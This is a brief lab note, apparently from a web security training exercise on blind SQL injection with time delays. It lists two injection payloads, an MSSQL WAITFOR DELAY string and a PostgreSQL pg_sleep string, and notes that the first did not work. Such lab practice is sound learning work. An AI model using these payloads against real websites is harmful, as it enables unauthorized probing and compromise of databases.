
### Blind SQL injection with time delays : PRACTITIONER

---

> Add the payload
```
' || WAITFOR DELAY '0:0:10' --
```
> Doesn't work. Maybe PostgreSql
```
' ||( SELECT pg_sleep(10)) --'
```

---
